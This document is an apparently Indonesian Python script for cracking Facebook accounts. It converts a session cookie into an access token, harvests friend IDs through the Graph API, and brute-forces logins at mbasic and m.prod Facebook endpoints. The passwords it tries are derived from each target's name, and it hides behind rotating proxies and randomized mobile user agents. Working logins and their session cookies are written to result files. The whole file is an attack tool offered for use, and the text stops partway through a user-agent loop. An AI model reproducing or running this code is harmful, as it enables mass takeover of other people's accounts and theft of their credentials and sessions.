### ------ [ Import Module Terlebih Dahulu ] ------- ###
import requests,json,os,sys,bs4,random,datetime,time,re,zlib,subprocess,base64
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as panel
from rich import print as cetak
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
from bs4 import BeautifulSoup as sop
from rich import pretty
pretty.install()
CON=sol()
xfii = Console()
ses=requests.Session()
### ------- [ Data Server ] ------- ###
id,id2 = [],[]
loop,ok,cp = 0,0,0
ugen,ugen2 = [],[]
lupapw,pwelu = [],[]
rr, rc = random.randint, random.choice
rg = random.randrange
metode,tokenku = [],[]
### ------- [ Proxy Site ] ------- ###
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(f'{P}[{K}+{P}] {M}Tidak Ada Koneksi.....{P}')
### ------- [ Warna Rich ] ------- ###
P = '\x1b[1;97m'      # --- [ PUTIH ] --- #
M = '\x1b[1;91m'     # --- [ MERAH ] --- #
H = '\x1b[1;92m'     # --- [ HIJAU ] --- #
K = '\x1b[1;93m'     # --- [ KUNING ] --- #
B = '\x1b[1;94m'     # --- [ BIRU + ] --- #
U = '\x1b[1;95m'     # --- [ UNGU ] --- #
O = '\x1b[1;96m'     # --- [ BIRU - ] --- #
N = '\33[m'             # --- [ DEFAULT ] --- #
def cihuy():
	os.system('clear')
### ------- [ Banner Logo ] ------- ###
def Benner():
	print(f"{P}[{H}•{P}] Don't Change My Banner")
	print(f"{P}[{H}•{P}] Author  : {H}FiiXc4You{P}")
	print(f"{P}[{H}•{P}] Version : {H}Private{P}")
	print(f"{P}[{H}•{P}] Don't sell free scripts")
### ------ [ Cek Cuki Terlebih Dahulu ] ------- ###
def Lgine():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cooki.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			mnnu()
		except KeyError:
			logincoki()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		logincoki()
### ------- [ login Coookies ] ------- ###
def logincoki():
    cihuy()
    Benner()
    print(f"\n{P}[{H}!{P}] Masukan Cookies Anda Gunakan Akun Tumbal")
    cookie = input(f'{P}[{H}?{P}] Cookie : {H}')
    if cookie in ['01','1']:filekrek()
    token_eaab = generate_token_eaab(cookie)
    print(f"{P}[{H}!{P}] {H}{token_eaab}\n")
    tokenw = open(".token.txt", "w").write(token_eaab)
    cokiew = open(".cooki.txt", "w").write(cookie)
    print(f"{P}[{H}!{P}] Login Cookies Berhasil Silahkan Ketik python run.py")
def generate_token_eaab(cok):
    r = requests.Session()
    req1 = r.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies={'cookie':cok},allow_redirects=True).text
    nek1 = re.search('window\.location\.replace\("(.*?)"\)',str(req1)).group(1).replace('\\','')
    req2 = r.get(nek1,cookies={'cookie':cok},allow_redirects=True).text
    tok  = re.search('accessToken="(.*?)"',str(req2)).group(1)
    return(tok)
### ------- [ Menu ] ------- ###
def mnnu():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cooki.txt','r').read()
	except IOError:
		print(f'{P}[{H}!{P}] Cookiees Anda Kadaluarsa')
		time.sleep(2)
		logincoki()
	cihuy()
	Benner()
	print(f"\n{P}[{H}1{P}] Dump With Publik\n{P}[{H}2{P}] Dump With File\n{P}[{H}0{P}] Logout")
	Xnxx = input(f"{P}[{H}?{P}] Input : ")
	if Xnxx in ['01','1']:DumpPublik()
	elif Xnxx in ['02','2']:filekrek()
	elif Xnxx in ['00','0']:os.system('rm -rf.token.txt && rm -rf.cooki.txt');print(f'{P}[{H}!{P}] Logout Berhasil')
	else:
		print(f"{P}[{H}!{P}] Anda Waras  ???")
### ------- [ Dump Publik ] -------- ###
def DumpPublik():
    uid = []
    tok = open('.token.txt','r').read()
    cok = open('.cooki.txt','r').read()
    print(f"\n{P}[{H}!{P}] Gunakan (,) Untuk Krek Massal")
    lid = input('Masukan Id : ').split(',')
    for usrr in lid:
        try:
            r = requests.Session()
            url = f'https://graph.facebook.com/v12.0/{usrr}/friends'
            LoopDump(r, cok, tok, url, id, None)
        except KeyboardInterrupt: pass
        except Exception as e: pass
        print(f"\r")
    SettAid()
def LoopDump(r, cok, tok, url, id, after):
    try:
        dta = {'access_token':tok,'after':after,'pretty':'1'}
        req = r.get(url,params=dta,cookies={'cookies':cok}).json()
        if 'temporarily blocked' in str(req):
            print('Oops, Sepertinya Akunmu Spam!')
            exit('')
        for d in req['data']:
            try:
                woy = (d['id']+'|'+d['name'])
                if woy in id:pass
                else:id.append(woy)
                print(f'\r{P}[{H}!{P}] Sedang Dump {H}%s {P}ID'%(str(len(id))),end=''); sys.stdout.flush()
            except Exception as e: continue
        after = req['paging']['cursors']['after']
        LoopDump(r,cok,tok,url,id,after)
    except KeyboardInterrupt: pass
    except Exception as e: pass
### -------- [ Dump File ] ------- ###
def filekrek():
	try:vin = os.listdir('/sdcard/DUMP')
	except FileNotFoundError:
		print(f"{P}[{H}!{P}] Tidak Ada File Yang Terdetek")
		time.sleep(2)
		back()
	if len(vin)==0:
		print(f"{P}[{H}!{P}] File Dump Tidak Ada")
		time.sleep(2)
		back()
	else:
		print(f"\n{P}[{H}!{P}] Pilih File Yang Ingin Anda Krek")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/DUMP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
				lol.update({str(cih):str(isi)})
				lol.update({nom:str(isi)})
			#	cetak(panel(f"[b white][[b cyan]{nom}[b white]] {isi} [b green]{len(hem)}[b white] ID",width=50,style=f"{jkt_48}"))
				print(f"\n{P}[{H}{nom}{P}] {isi} {H}{len(hem)}{P} Account")
			else:
				lol.update({str(cih):str(isi)})
				print(f"\n{P}[{H}{nom}{P}] {isi} {H}{len(hem)} {P}Account")
		#		cetak(panel(f"[b cyan]{nom}.{PU} {isi} [b green]{len(hem)} ID",width=50,style=f"{jkt_48}"))
		geeh = input(f'{P}[{H}!{P}] Choice : ')
		try:geh = lol[geeh]
		except KeyError:
			print(f'{P}Pilih Yang Bener Kontol{P}')
			time.sleep(3)
			back()
		try:lin = open('/sdcard/DUMP/'+geh,'r').read().splitlines()
		except:
			print(f"{P}[{H}!{P}] Tidak Ada File Yang Terdetek")
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
		SettAid()
### -------- [ Setting Id ] ------- ###
def SettAid():
	print('')
	print(f"{P}[{H}1{P}] Akun Old\n{P}[{H}2{P}] Akun New\n[{H}3{P}] Akun Random")
	hu = input(f'{P}[{H}?{P}] Pilih : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(f"{P}[{H}?{P}] Butuh Bantuan? ")
		exit()
### ----- [ Setting Metode ] ----- ###
	print(f"{P}\n[{H}1{P}] Gunakan Metode {H}m.prod.facebook.com{P}\n[{H}2{P}] Gunakan Metode {H}mbasic.facebook.com{P}")
	xnnx = input(f"{P}[{H}?{P}] Pilih : ")
	if xnnx in ['01','1']:
		metode.append('mprod')
	elif xnnx in ['02','2']:
		metode.append('mbsic')
	else:
		metode.append('AdelValid')
	xxtx = input(f"\n{P}[{H}?{P}] Ingin Menambahkan Password? Y/T : ")
	if xxtx in ['y','Y']:
		pwelu.append('ya')
		print(f"{P}[{H}!{P}] Masukan Password 6 Karakter Gunakan (,) Untuk Lebih Dari Satu Kata")
		kiwkiw = input(f"{P}[{H}?{P}] Masukan Password : ")
		butsanndi = kiwkiw.split(',')
		for xixixi in butsanndi:
			lupapw.append(xixixi)
	else:
		pwelu.append('no')
	passlist()
### ------- [ Wordlist ] ------- ###
def passlist():
	global loop,prog,des
	rr = random.randint
	cihuy()
	Benner()
	print(f"\n{P}[{H}!{P}] Total Account : {H}{len(id)}")
	print(f"{P}[{H}!{P}] OK Save In {H}HASIL-OK/{hasil_ok}")
	print(f"{P}[{K}!{P}] CP Save In {K}HASIL-CP/{hasil_cp}")
	print(f"{P}[{H}!{P}] Mainkan Mode Pesawat setiap 200 Id\n")
	prog = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'),TimeElapsedColumn())
	des = prog.add_task('',total=len(id))
	with prog:
		with tred(max_workers=30) as totol:
			for tolol in id2:
				idf,nmf = tolol.split('|')[0], tolol.split('|')[1].lower()
				frs = nmf.split('  ')[0]
				pwkuh = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwkuh.append(nmf)
						pwkuh.append(frs+'321')
						pwkuh.append(frs+'123')
						pwkuh.append(frs+'12345')
						pwkuh.append(frs+'1234')
						pwkuh.append(frs+str(rr(100,2999)))
				else:
					if len(nmf)<3:
						pwkuh.append(nmf)
					else:
						pwkuh.append(nmf)
						pwkuh.append(frs+'321')
						pwkuh.append(frs+'123')
						pwkuh.append(frs+'12345')
						pwkuh.append(frs+'1234')
						pwkuh.append(frs+str(rr(100,2999)))
				if 'ya' in pwelu:
					for kntol in lupapw:
						pwkuh.append(kntol)
				else:pass
				if 'mprod' in metode:
					totol.submit(crackp,idf,pwkuh)
				elif 'mbasic' in metode:
					totol.submit(crackm,idf,pwkuh)
				else:
					totol.append(crackp,idf,pwkuh)
	print(f"\n{P}[{H}!{P}] {H}OK:{ok}\n{P}[{K}!{P}] {K}CP:{cp}")
### ------- [ Mbasic ] ------- ###
def crackm(idf,pwkuh):
	global loop,ok,cp
	prog.update(des,description=f'\r{P}[{H}•{P}] Running {H}OK-:{ok} {K}CP-:{cp}  ')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwkuh:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'fr_FR,fr;q=0.9,en-US;q=0.8,en;q=0.7','connection': 'close'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"{P}[{K}CP{P}] {K}{idf}•{pw}")
				open('HASIL-CP/'+hasil_cp,'a').write(idf+'|'+pw+'\n')
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"{P}[{H}OK{P}] {H}{idf}|{pw}")
				open('HASIL-OK/'+hasil_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
### ------- [ Mprof ] ------- ###
def crackp(idf,pwkuh):
	global loop,ok,cp
	prog.update(des,description=f'\r{P}[{H}•{P}] Running {H}OK-:{ok} {K}CP-:{cp}  ')
	prog.advance(des)
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwkuh:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.prod.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.prod.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.prod.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				cp+=1
				print(f"{P}[{K}CP{P}] {K}{idf}•{pw}")
				open('HASIL-CP/'+hasil_cp,'a').write(idf+'|'+pw+'\n')
				break
			elif 'c_user' in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"{P}[{H}OK{P}] {H}{idf}|{pw}")
				open('HASIL-OK/'+hasil_ok,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1
### ------- [ Kalendar ] ------- ###
bla = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
hh = datetime.datetime.now().day
bb = bla[(str(datetime.datetime.now().month))]
yy = datetime.datetime.now().year
hasil_ok = f"OK-{hh}-{bb}-{yy}.txt"
hasil_cp = f"CP-{hh}-{bb}-{yy}.txt"
### ------- [ User Agent ] ------- ###
for tu in range(10000):
	dev_a = rc([f'CPH{rr(1700, 1899)}',f'CPH{rr(1800, 2399)}'])
	dev_b = rc([f'V{rr(1920, 2299)}',f'vivo {rr(1000, 2000)}'])
	dev_c = rc([f'RMX{rr(1800, 2399)}',f'RMX{rr(3000, 3399)}'])
	dev_d = rc([f'Infinix X{rr(550, 699)}{rc(["B", "D",""])}'])
	andro = rc([f'{str(rr(5,9))}.0{rc([".0", ""])}', rr(7,14)])
	bhasa = rc(['en-us',  'en-gb', 'id-id', 'ms-my',  'zh-cn'])
	bulid = rc(['O11019','LMY47V','NRD90M','MRA58K', 'LMY47I'])
	dukaa = rc(['LMY47I','RP1A','PPR1','PKQ1', 'SP1A', 'TP1A'])
	teing = rc([f'00{str(rr(1, 9))}',   f'0{str(rr(10, 32))}'])
	build = rc([f'{dukaa}.{str(rg(130000,  230000))}.{teing}'])
	crhom = (f'{rr(99, 123)}.0.{rg(5000, 6299)}.{rr(40, 199)}')
	rkrut = rc([f'{dev_a}', f'{dev_b}',f'{dev_c}', f'{dev_d}'])
	uaku =  rc([f"Mozilla/5.0 (Linux; Android {andro}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom} Mobile Safari/537.36{rc(['',f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' GoogleApp/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f' GSA/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(rr(300,399))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};]',f' [FB_IAB/FB4A;FBAV/{str(rr(400,449))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};] FBNV/1',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 {andro}) NABar/1.0',f' baiduboxapp/4.8 (Baidu; P1 {andro})',f' Edg/{str(rr(73,129))}.0.{str(rr(1200,2999))}.{str(rr(73,250))}',''])}",
				f"Mozilla/5.0 (Linux; Android {andro}; {rkrut}{rc(['',f' Build/{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{crhom} Mobile Safari/537.36{rc(['',f' EdgA/{str(rr(30,129))}.0.{str(rr(1100,1299))}.{str(rr(10,99))}',f' AlohaBrowser/{str(rr(1,5))}.{str(rr(0,29))}.{str(rr(0,9))}',f' AlohaBrowser/{str(rr(1,5))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}',f' OPX/{str(rr(1,2))}.{str(rr(0,9))}',''])}",
				f"Mozilla/5.0 (Linux; U; Android {andro}; {bhasa}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom} Mobile Safari/537.36{rc([f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' HeyTapBrowser/{str(rr(6,49))}.{str(rr(7,8))}.{str(rr(2,40))}.{str(rr(1,9))}',f' OPT/{str(rr(1,2))}.{str(rr(0,9))}',f' PHX/{str(rr(4,14))}.{str(rr(0,9))}'])}",
				f"Mozilla/5.0 (Linux; U; Android {andro}; {bhasa}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom}{rc([f' Quark/{str(rr(1,6))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,999))}',f' UCBrowser/{str(rr(1,19))}.{str(rr(1,9))}.{str(rr(1,9))}.{str(rr(100,1299))}',f' MQQBrowser/{str(rr(4,10))}.{str(rr(0,9))}'])} Mobile Safari/537.36",
				f"Mozilla/5.0 (Linux; U; Android {andro}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom} Mobile Safari/537.36 OPR/{str(rr(10,83))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}"]);ugen.append(uaku)
### ------- [ User Agent 2 ] -------- ###
for tu in range(10000):
	dev_a = rc([f'CPH{rr(1700, 1899)}',f'CPH{rr(1800, 2399)}'])
	dev_b = rc([f'V{rr(1920, 2299)}',f'vivo {rr(1000, 2000)}'])
	dev_c = rc([f'RMX{rr(1800, 2399)}',f'RMX{rr(3000, 3399)}'])
	dev_d = rc([f'Infinix X{rr(550, 699)}{rc(["B", "D",""])}'])
	andro = rc([f'{str(rr(5,9))}.0{rc([".0", ""])}', rr(7,14)])
	bhasa = rc(['en-us',  'en-gb', 'id-id', 'ms-my',  'zh-cn'])
	bulid = rc(['O11019','LMY47V','NRD90M','MRA58K', 'LMY47I'])
	dukaa = rc(['LMY47I','RP1A','PPR1','PKQ1', 'SP1A', 'TP1A'])
	teing = rc([f'00{str(rr(1, 9))}',   f'0{str(rr(10, 32))}'])
	build = rc([f'{dukaa}.{str(rg(130000,  230000))}.{teing}'])
	crhom = (f'{rr(99, 123)}.0.{rg(5000, 6299)}.{rr(40, 199)}')
	rkrut = rc([f'{dev_a}', f'{dev_b}',f'{dev_c}', f'{dev_d}'])
	uaku =  rc([f"Mozilla/5.0 (Linux; Android {andro}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom} Mobile Safari/537.36{rc(['',f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' GoogleApp/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f' GSA/{str(rr(5,14))}.{str(rr(1,50))}.{str(rr(1,40))}.{str(rr(1,30))}.arm64',f'[FBAN/EMA;FBLC/id_ID;FBAV/{str(rr(300,399))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};]',f' [FB_IAB/FB4A;FBAV/{str(rr(400,449))}.0.0.{str(rr(0,49))}.{str(rr(0,249))};] FBNV/1',f' T7/12.10 SP-engine/2.28.0 baiduboxapp/12.10.0.10 (Baidu; P1 {andro}) NABar/1.0',f' baiduboxapp/4.8 (Baidu; P1 {andro})',f' Edg/{str(rr(73,129))}.0.{str(rr(1200,2999))}.{str(rr(73,250))}',''])}",
				f"Mozilla/5.0 (Linux; Android {andro}; {rkrut}{rc(['',f' Build/{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{crhom} Mobile Safari/537.36{rc(['',f' EdgA/{str(rr(30,129))}.0.{str(rr(1100,1299))}.{str(rr(10,99))}',f' AlohaBrowser/{str(rr(1,5))}.{str(rr(0,29))}.{str(rr(0,9))}',f' AlohaBrowser/{str(rr(1,5))}.{str(rr(0,9))}.{str(rr(0,9))}.{str(rr(0,9))}',f' OPX/{str(rr(1,2))}.{str(rr(0,9))}',''])}",
				f"Mozilla/5.0 (Linux; U; Android {andro}; {bhasa}; {rkrut} Build/{rc([f'{build}',f'{bulid}'])}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{crhom} Mobile Safari/537.36{rc([f' OPR/{str(rr(10,80))}.{str(rr(0,1))}.{str(rr(1000,6999))}.{str(rr(10000,69999))}',f' HeyTapBrowser/{str(rr(6,49))}.{str(rr(7,8))}.{str(rr(2,40))}.{str(rr(1,9))}',f' OPT/{str(rr(1,2))}.{str(rr(0,9))}',f' PHX/{str(rr(4,14))}.{str(rr(0,9))}'])}",
